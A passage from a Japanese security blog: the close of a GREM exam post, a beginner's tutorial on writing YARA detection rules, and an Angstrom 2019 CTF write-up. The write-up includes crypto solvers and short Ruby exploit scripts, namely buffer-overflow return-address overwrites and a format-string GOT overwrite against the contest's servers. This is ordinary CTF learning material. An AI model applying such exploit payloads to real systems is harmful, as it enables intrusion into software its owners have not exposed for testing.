</ul>

<h2 id="おわりに">おわりに</h2>

<p>以上が、GREM合格までの話である。一般に、資格試験というのは比較的勉強した成果がちゃんとついてきてくれるものだと思っている。受ける方は、ぜひいっぱい勉強して受かってほしい。この試験勉強を通して学んだことはとても有意義で良いスキルが身についたと思った。<s>某なんちゃら支援士よりもよっぽどスキルが身についた気がする。</s></p>

<p>所感だが、なんとかGWの勉強の成果が出てよかった。実は、本試験は、受験期限日のギリギリに受ける予定だったのだが、模擬試験でスコアがふるわず若干ヤケになって模擬試験を受けた翌日に試験を申し込んでいた。その結果、夜に飲み会があるのに、午前中に試験を受けるというアホなスケジュールになってしまった。不合格だったら落ち込んで飲み会に行くつもりだったが、それは避ける事ができたよかった。</p>

<p>最後に、勉強時間を捻出するために、家事など全面的に協力してくれた奥さんに感謝したいと思う。</p>

  
<footer>
  <ul class="Tags">
    
    
    
    <li class="Tags-item u-background">
      <a class="Tags-link u-clickable" href="https://owlinux1000.github.io/blog/tags/giac/" rel="tag">GIAC</a>
    </li>
    
    
  </ul>
</footer>

</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/yara/" rel="bookmark">平成のうちに理解しておくYara 入門</a>
  </h2>
  
  <time datetime="2019-04-29T07:03:53&#43;09:00">
    29 April, 2019
  </time>
  
</header>
  

<blockquote>
<p>&ldquo;平成も終わるし、知ったかぶりしてる技術を令和に持ち越さないようにしような&rdquo;</p>
</blockquote>

<h2 id="目次">目次</h2>

<ul>
<li>Yara とは</li>
<li>はじめてのYara ルール</li>
<li>文字列を用いたYara ルール</li>
<li>正規表現を用いたYara ルール</li>
<li>複数条件を用いたYara ルール</li>
<li>Yara の便利機能</li>
<li>モジュール機能を用いたYara ルール</li>
<li>Pythonから利用するYara ルール</li>
<li>まとめ</li>
</ul>

<h2 id="yara-とは">Yara とは</h2>

<p>Yaraは、「<strong>Yara ルール</strong>」と呼ばれる専用のルールを用いて、マルウェアや悪意あるファイルなどを検知することのできるツールです。Yara ルールでは、文字列による検査や正規表現、論理条件などをサポートしており複雑なルールを構築することもできます。利用例として、あるマルウェアファミリーの特徴をYara ルールとして作成しておくことで、新しいマルウェアが発見されたときに既知のマルウェアファミリーに性質が近いかどうかなどを検知することができます。Yara は、<a href="https://cuckoosandbox.org/" target="_blank">Cuckoo Sandbox</a>など他のセキュリテイツールと連携していることが多く、セキュリテイに関わる人間としては、一度読み書きしておいた方が良いツールの１つです。本記事では、Yara を使ったこと無い人向けに基本的な概念やルールを幅広くご紹介します。<br />
まずは、Yara を利用するためにインストールしましょう。Ubuntu では、<code>apt</code>からインストールすることができます。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ sudo apt install yara</pre></div>
<p>また、Macでは<code>brew</code>からインストールすることが可能です。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ brew install yara</pre></div>
<p>インストールできたら、以下のコマンドを入力して、Yara のバージョンを確認してください。なお本記事では、バージョン3.9.0を対象に執筆しています。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara --version
3.9.0</pre></div>
<h2 id="はじめてのyara-ルール">はじめてのYara ルール</h2>

<p>では、さっそくはじめてのYara ルールを作成してみましょう。以下に、必ず検知するルールを示します。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">// hello_rule.yara
rule hello
{
    condition:
        true
}</pre></div>
<p>Yaraでは、<code>rule</code>キーワードを用いてルールを作成します。ここで<code>hello</code>はルール名にあたり、実際の条件が<code>condition</code>が<code>true</code>のときに検知することを意味しています。本例では、一般的なプログラミング言語と同様に、条件文が必ず真となります。そのため、必ず検知することができます。また、先頭の1行目は、コメント文です。Yara ルールのファイルの拡張子は、<code>.yara</code>や<code>.yar</code>の場合が多いです。<br />
では、このルールを用いて実際に検知するか確認してみましょう。そのために検査対象となるファイルを<code>hello.txt</code>として以下の内容で作成してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">HelloWorld!</pre></div>
<p>以下の以下コマンドを実行してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara hello_rule.yara hello.txt
hello hello.txt</pre></div>
<p>本コマンドでは、<code>hello.txt</code>ファイルに対して、<code>hello_rule.yara</code>を用いて検査しています。また、<code>hello</code>というルールで<code>hello.txt</code>が検知していることがわかります。
Yara ルールによる検査は、ファイルの他にディレクトリやPIDを指定することもでき、それらの検査も行うことが可能となっています。</p>

<p>Yara ルールは、特別なシンタックスで書かれているので、エディタ等のシンタックスハイライトや補完プラグインの利用をおすすめします。Emacs ユーザならば、melpaで<code>yara-mode</code>が配布されているので、<code>package</code>でインストールすることができます。</p>

<h2 id="文字列を用いたyara-ルール">文字列を用いたYara ルール</h2>

<p>先程の例では、無条件に合致するルールを作成していました。次は、<code>hello.txt</code>に格納されている<code>HelloWorld!</code>という文字列を含んでいるファイルを検知するルールを作成してみましょう。<code>condition</code>の条件として、検知したい文字列を設定します。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule hello_string
{
    condition:
        &#34;HelloWorld!&#34;
}</pre></div>
<p>本ルールを用いて、先程と同様に検査してみましょう。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara hello_string_rule.yara hello.txt
hello_string_rule(5): warning: Using literal string &#34;HelloWorld!&#34; in a boolean operation.
hello_string hello.txt</pre></div>
<p>先程と同様に検知できましたが、警告が出ています。これは、文字列リテラルを用いて直接条件を設定しているため出ています。ルールの中で文字列を変数として定義し、その変数を用いることでこの警告は出力されなくなります。以下のようにルールを変更してください</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule hello_string
{
    strings:
        $s = &#34;HelloWorld!&#34;
    condition:
        $s
}</pre></div>
<p><code>strings</code>キーワードを用いて、変数を定義することができます。再度検査すると警告文が出てきません。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara hello_string.yara hello.txt
hello_string hello.txt</pre></div>
<p>Yara では、変数の後に様々なキーワードを設定することでより柔軟に検査することができます。例えば、以下のルールでは、検知したい文字列の後に、<code>nocase</code>を記載することで、case-insentive に文字列を認識し、検査してくれます。そのため、<code>hEllOwORLD!</code> といった文字列も検知することができます。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule hello_string
{
    strings:
        $s = &#34;HelloWorld!&#34; nocase
    condition:
        $s
}</pre></div>
<p><code>nocase</code>の他にも、<code>wide</code>でUnicode文字列などの場合も検知することが可能となります。もしAscii文字列とUnicode文字列を両方検知したい場合は、<code>wide</code> と<code>ascii</code> の両方をつけることで可能となります。<br />
<code>fullword</code>を設定すると、検知した文字列が、アルファベット以外で終端してる場合のみ検知することが可能となります。（例：<code>apple</code> を検知したい文字列に設定している場合に、<code>applejuice.com</code>は検知しないが、<code>apple.com</code>は検知することができる）</p>

<h2 id="正規表現を用いたyara-ルール">正規表現を用いたYara ルール</h2>

<p>Yara では、正規表現を用いた検査を行うことができます。例えば、<code>a</code>から始まる文字列を検知する場合を考えてみます。正規表現を用いる場合は、以下のように<code>&quot;</code>ではなく、<code>/</code>で囲います。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule regexp
{
    strings:
        $s1 = /^a/
    condition:
        $s1
}</pre></div>
<p>また、正規表現においても、<code>nocase</code>のようなキーワードを付与することもできます。</p>

<h2 id="複数条件を用いたyara-ルール">複数条件を用いたYara ルール</h2>

<p>今までのルールでは、単一の条件にマッチした場合でしたが、<code>condition</code>に、論理演算子を用いることで、より複雑な条件を構築することができます。例として、以下の内容で<code>hello2.txt</code>を作成してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">Hello World!</pre></div>
<p>そして、<code>hello2.txt</code>を先程作成した<code>hello_string_rule.yara</code>で検査してみてください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara hello_string_rule.yara hello2.txt</pre></div>
<p>結果として検知されず何も表示されません。<code>hello_string_rule.yara</code>では、<code>HelloWorld!</code>をルールにしていたため、間にスペースがある<code>hello2.txt</code>では検知することができませんでした。そこで次に、<code>Hello World!</code>も条件として加え、<code>HelloWorld!</code> または<code>Hello World!</code>の場合に検知するようにルールを作成します。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule hello_string
{
    strings:
        $s1 = &#34;HelloWorld!&#34;
        $s2 = &#34;Hello World!&#34;
    condition:
        $s1 or $s2
}</pre></div>
<p>上記ルールでは、文字列として2つ定義し、それらを<code>or</code>で接続することで条件を構築しています。以下のように<code>hello.txt</code>と<code>hello2.txt</code>の両方を検査してみましょう。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara hello_string2_rule.yara hello2.txt
hello_string hello2.txt
$ yara hello_string2_rule.yara hello.txt
hello_string hello.txt</pre></div>
<p>両方とも検知していることがわかります。<br />
Yara には、<code>or</code>以外にも<code>and</code>や<code>not</code>など様々な条件に使えるキーワードがあります。詳しくは、<a href="https://yara.readthedocs.io/en/v3.5.0/writingrules.html" target="_blank">公式ドキュメント</a>を参照してください。</p>

<h2 id="yara-の便利機能">Yara の便利機能</h2>

<p>ここでは、個人的に便利そうだなと思った機能をいくつかご紹介します。</p>

<h3 id="特別な値を用いたルール">特別な値を用いたルール</h3>

<p>Yara は、主にマルウェアを対象として検知を行うツールなため、標準で文字列マッチ以外にも便利な機能が備わっています。例えば、以下は、対象ファイルのファイルサイズが200KBより大きかった場合に検知するルールの例です。<code>filesize</code>は、特別な値で元から検査対象のファイルのサイズが格納されています。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule FileSizeExample
{
    condition:
       filesize &gt; 200KB
}</pre></div>
<p>また、後述するモジュール機能を用いることで、より多くの特別な値をルールで利用することができます。</p>

<h3 id="yara-ルールのメタデータ">Yara ルールのメタデータ</h3>

<p>Yara ルールには、メタデータの設定を行うことが可能です。rule中に、<code>meta</code>キーワードを用いることで、メタデータを格納することができます。以下に例を示します。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule FileSizeExample
{
    meta:
       description = &#34;File size check&#34;
    condition:
       filesize &gt; 200KB
}</pre></div>
<p>このルールでは、<code>description</code>というメタデータを設定しています。このメタデータは、<code>yara</code> コマンドのオプション<code>-m</code> を設定することで表示することができます。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara -m elf_rule.yara hello
elf_64 [description=&#34;File size check&#34;] hello</pre></div>
<h3 id="yara-ルールのタグ">Yara ルールのタグ</h3>

<p>メタデータと似た機能として、タグの設定を行うことも可能です。ルール名の後に、<code>:</code>でタグ名を記載します。複数設定した場合は、スペースで分割して記載します。以下に<code>hello_rule</code>にタグを設定した例を示します。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">rule hello : myfirstrule
{
    condition:
        true
}

rule hello2 : mysecondrule
{
    condition:
        true
}</pre></div>
<p><code>hello</code>ルールには、<code>myfirstrule</code>、<code>hello2</code>ルールには、<code>mysecondrule</code>というタグを設定しています。今までのようにこのルールを用いて検査を行うと、以下のように<code>hello</code>と<code>hello2</code>の両方のルールにマッチしていることがわかります。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara hello_rule.yara hello.txt
hello hello.txt
hello2 hello.txt</pre></div>
<p>しかしながら、タグを設定することで、特定のタグのルールのみを表示するといったフィルターのような処理を行うことができます。オプション<code>-t</code> に、<code>myfirstrule</code>を設定することで、<code>hello</code>ルールのみを表示することが可能です。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara -t myfirstrule hello_rule.yara hello.txt
hello hello.txt</pre></div>
<h3 id="yara-ルールを分割管理">Yara ルールを分割管理</h3>

<p>1ファイルに多くのYara ルールを記載することは、管理上の観点からも好ましくありません。そこで、Yara では<code>include</code>文を利用することで分割されたファイルを読みこむことが可能となります。以下の例では、最初に作った<code>hello_rule</code>を読み込んでいます。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">include &#34;./hello_rule&#34;
rule regexep
{
    strings:
        $s1 = /^a/
    condition:
        $s1
}</pre></div>
<h2 id="モジュール機能を用いたyara-ルール">モジュール機能を用いたYara ルール</h2>

<p>Yara には、モジュール機能があります。特に、PE モジュールは、マルウェア解析者にとってよく使うモジュールの1つです。PE モジュールの他にも、ELF モジュールやCuckoo モジュール、Hash モジュール、Magic モジュールなどがあります。モジュールは、<code>import</code> 文を用いて読み込みます。今回は、ELF モジュールを用いた例を見てみましょう。以下は、ELFバイナリがx64向けの場合検知するルールです。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">import &#34;elf&#34;

rule elf_64
{
    condition:
        elf.machine == elf.EM_X86_64
}</pre></div>
<p>本ルール検証のために、<code>Hello World!</code>と表示するELFバイナリを作成します。以下のC言語のファイルを作成してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bc7a00">#include</span> <span style="color:#bc7a00">&lt;stdio.h&gt;</span><span style="color:#bc7a00">
</span><span style="color:#bc7a00"></span><span style="color:#b00040">void</span> <span style="color:#00f">main</span>() {
  printf(<span style="color:#ba2121">&#34;Hello World!&#34;</span>);
}</code></pre></div>
<p>以下のようにコンパイルして、実行ファイルを作成してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ gcc hello.c -o hello</pre></div>
<p>作成したELFバイナリに対して検査をすると検知していることがわかります。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ yara elf_rule.yara hello
elf_64 hello</pre></div>
<p>次に、IOCなどでもよく使われるハッシュ値を用いたルールを作成してみましょう。ハッシュ値を求める処理は、Hash モジュールを読み込むことで利用できます。Hash モジュールでは、md5やsha1、 sha256の代表的なハッシュアルゴリズムによるハッシュ値が求められます。まずは、検査対象となる<code>hello.txt</code>のsha256ハッシュ値を求めてみましょう。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ shasum -a 256 hello.txt
209a3f843d2a572c2d66457dd7c8a6120fa308949867a5ebed5f4dca08fe4920  hello.txt</pre></div>
<p>では、このハッシュ値を用いて、読み込んだファイルのハッシュ値と等しかったら検知させるルールを作成してみましょう。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">import &#34;hash&#34;
rule sha256
{
     condition:
         hash.sha256(0, filesize) == &#34;209a3f843d2a572c2d66457dd7c8a6120fa308949867a5ebed5f4dca08fe4920&#34;
}</pre></div>
<p>Hash モジュールのハッシュ値を求める機能では、2つの引数を設定できます。本例における前者の<code>0</code>は、ファイルのオフセットを示しています。つまり、ファイルの先頭からのハッシュ値を求めようとしています。ファイルオフセットを適切に設定することで、生の攻撃ペイロードの不要部分を飛ばし、適切な位置からハッシュ値を求めることも可能となります。また、2つ目の引数は、サイズを示しており、今回の例だと<code>filesize</code>つまり、ファイル全体を示しています。そのため、第1引数に<code>0</code>、第2引数に<code>filesize</code>を設定することで、ファイル全体のハッシュ値を算出することができます。本機能における戻り値のハッシュ値は、lowercase で帰ってくるため、比較する際には気をつけてください。</p>

<h2 id="pythonから利用するyara-ルール">Pythonから利用するYara ルール</h2>

<p>Yara ルールのファイルは、<code>yara</code>コマンドだけでなく、Pythonから利用することも可能です。Python から利用することで、よりプログラマブルにYara を利用することができるため、システムに組み込むことが容易になります。利用するためには、<code>yara-python</code>というライブラリをインストールしてください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ pip install yara-python</pre></div>
<p>では、2つ目に作成した<code>hello_string_rule</code>のYara ルールファイルを読み込んで検査してみましょう。以下の検査スクリプトを<code>hello.py</code>として作成してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">yara</span>
rules <span style="color:#666">=</span> yara<span style="color:#666">.</span><span style="color:#008000">compile</span>(<span style="color:#ba2121">&#39;hello_rule.yara&#39;</span>)
result <span style="color:#666">=</span> rules<span style="color:#666">.</span>match(<span style="color:#ba2121">&#39;hello.txt&#39;</span>)
<span style="color:#008000;font-weight:bold">print</span>(result)</code></pre></div>
<p>上記スクリプトを実行してください。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ python hello.py
[hello_string]</pre></div>
<p>実行すると予定通り検知していることがわかります。また、検知したファイルがない場合は、空の配列が帰ってくるため注意してください。</p>

<h2 id="まとめ">まとめ</h2>

<p>今回、マルウェアなどを検知するルールベースのツールYara を見てきました。Yara は、文字列やファイルサイズ、バイナリの情報などを様々な値を用いて柔軟にルールを作成することができます。また、Pythonから利用するなどプログラマブルな使い方も可能となっています。ぜひYara を用いて様々な悪意ある挙動をするファイルを検知していきましょう。</p>

  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/angstrom2019/" rel="bookmark">Angstrom2019 writeup</a>
  </h2>
  
  <time datetime="2019-04-25T21:57:22&#43;09:00">
    25 April, 2019
  </time>
  
</header>
  

<h2 id="misc">Misc</h2>

<h3 id="irc">IRC</h3>

<ul>
<li>freenodeに入るとFLAG</li>
<li><strong>actf{like_discord_but_worse}</strong></li>
</ul>

<h2 id="the-mueller-report">The mueller Report</h2>

<ul>
<li>PDFが渡されるので、とりあえず<code>actf</code>でgrepするとFLAG</li>
<li><strong>actf{no0o0o0_col1l1l1luuuusiioooon}</strong></li>
</ul>

<h2 id="blank-pdf">Blank PDF</h2>

<ul>
<li>PDFが渡されるが開けず、<code>file</code>コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG</li>
<li><strong>actf{knot_very_interesting}</strong></li>
</ul>

<h2 id="paper-trail">Paper Trail</h2>

<ul>
<li>pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している</li>
<li><strong>actf{fake_math_papers}</strong></li>
</ul>

<h2 id="scratch-it-out">Scratch It Out</h2>

<ul>
<li>project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる</li>
<li>project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される</li>
<li>最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる</li>
<li>地味に面白い</li>
<li><strong>actf{Th5_0pT1maL_LANgUaG3}</strong></li>
</ul>

<h2 id="web">Web</h2>

<h3 id="control-you">Control you</h3>

<ul>
<li>HTMLソースを見てFLAG</li>
<li><strong>actf{control_u_so_we_can&rsquo;t_control_you}</strong></li>
</ul>

<h2 id="crypto">Crypto</h2>

<h3 id="classy-cipher">Classy Cipher</h3>

<ul>
<li>ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く</li>
<li><strong>actf{so_charming}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">encrypted <span style="color:#666">=</span> <span style="color:#ba2121">&#39;:&lt;M?TLH8&lt;A:KFBG@V&#39;</span>

<span style="color:#008000;font-weight:bold">for</span> i <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">range</span>(<span style="color:#666">0xff</span>):
    <span style="color:#008000;font-weight:bold">for</span> c <span style="color:#a2f;font-weight:bold">in</span> encrypted:
        <span style="color:#008000;font-weight:bold">print</span>(<span style="color:#008000">chr</span>((<span style="color:#008000">ord</span>(c)<span style="color:#666">-</span>i) <span style="color:#666">%</span> <span style="color:#666">0xff</span>), end<span style="color:#666">=</span><span style="color:#ba2121">&#39;&#39;</span>)</code></pre></div>
<h3 id="really-secure-algorithm">Really Secure Algorithm</h3>

<ul>
<li>RSAのパラメータがe, p, q, cが渡されるので復号するだけ</li>
<li><strong>actf{really_securent_algorithm}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require_relative <span style="color:#ba2121">&#39;../../tools/ctf/crypto.rb&#39;</span>

<span style="color:#008000">p</span> <span style="color:#666">=</span> <span style="color:#666">8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889</span>
q <span style="color:#666">=</span> <span style="color:#666">7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493</span>
e <span style="color:#666">=</span> <span style="color:#666">65537</span>
c <span style="color:#666">=</span> <span style="color:#666">7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349</span>

rsa <span style="color:#666">=</span> <span style="color:#800">RSA</span><span style="color:#666">.</span>new(e, <span style="color:#008000">p</span> <span style="color:#666">*</span> q, <span style="color:#008000">p</span>, q)
m <span style="color:#666">=</span> rsa<span style="color:#666">.</span>decrypt(c)
<span style="color:#008000">print</span>(<span style="color:#666">[</span>m<span style="color:#666">.</span>to_s(<span style="color:#666">16</span>)<span style="color:#666">].</span>pack(<span style="color:#ba2121">&#34;H*&#34;</span>))</code></pre></div>
<h2 id="half-and-half">Half and Half</h2>

<ul>
<li>ソースコードが渡されるので呼んでソルバを書くだけ

<ul>
<li>24文字を12byteに分割しxor取った値に等しくなるようにする</li>
<li>フラグフォーマットは、<code>actf{</code>なので先頭5byteと後半の5byteもxorして判明(<code>taste</code>)</li>
<li>問題文から<code>taste</code>に合うような単語で<code>coffee</code>を<code>actf{</code>の後に繋げると後半が<code>good</code>と文章が成り立つ</li>
</ul></li>
<li><strong>actf{coffee_tastes_good}</strong></li>
</ul>

<h2 id="runes">Runes</h2>

<ul>
<li>Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ

<ul>
<li>復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている</li>
</ul></li>
<li><strong>actf{crypto_lives}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#008000">require</span> <span style="color:#ba2121">&#39;gmp&#39;</span>

n <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z(<span style="color:#666">99157116611790833573985267443453374677300242114595736901854871276546481648883</span>)
<span style="color:#008000">p</span> <span style="color:#666">=</span> <span style="color:#666">310013024566643256138761337388255591613</span>
q <span style="color:#666">=</span> <span style="color:#666">319848228152346890121384041219876391791</span>
g <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z(<span style="color:#666">99157116611790833573985267443453374677300242114595736901854871276546481648884</span>)
c <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z(<span style="color:#666">2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869</span>)
l <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z((<span style="color:#008000">p</span> <span style="color:#666">-</span> <span style="color:#666">1</span>)<span style="color:#666">.</span>lcm(q <span style="color:#666">-</span> <span style="color:#666">1</span>))
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">L</span>(u, n)
  (u <span style="color:#666">-</span> <span style="color:#666">1</span>) <span style="color:#b68">/ n
</span><span style="color:#b68">end
</span><span style="color:#b68">c_lambda = L(c.powmod(l, n.pow(2)), n)
</span><span style="color:#b68">g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
</span><span style="color:#b68">m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
</span><span style="color:#b68">print([m].pack(&#34;H*&#34;))</span></code></pre></div>
<h2 id="binary">Binary</h2>

<h3 id="aquarium">Aquarium</h3>

<ul>
<li>gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ</li>
<li><strong>actf{overflowed_more_than_just_a_fish_tank}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 9999</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19305</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">0x98</span> <span style="color:#666">+</span> p32(<span style="color:#666">0x4011b6</span>)
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
z<span style="color:#666">.</span>sendline payload

<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recv</code></pre></div>
<h3 id="chain-of-rope">Chain of Rope</h3>

<ul>
<li>名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)</li>
<li><strong>actf{dark_web_bargains}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;localhost&#34;</span>, <span style="color:#666">9999</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19400</span>

<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;access</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">0x38</span> <span style="color:#666">+</span> p64(<span style="color:#666">0x401231</span>)
z<span style="color:#666">.</span>sendline payload

<span style="color:#008000">p</span> z<span style="color:#666">.</span>recv</code></pre></div>
<h3 id="purchases">Purchases</h3>

<ul>
<li>FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる</li>
<li>関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする

<ul>
<li>末尾2byteですむので楽に書き換えられる</li>
</ul></li>
<li><strong>actf{limited_edition_flag}</strong></li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
<span style="color:#408080;font-style:italic"># z = Sock.new &#34;localhost&#34;, 9999</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19011</span>
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;%4534c%10$hnAAAA</span><span style="color:#b62;font-weight:bold">\x18\x40\x40</span><span style="color:#ba2121">&#34;</span>
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;else. &#34;</span>
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recv</code></pre></div>
<h3 id="returns">Returns</h3>

<ul>
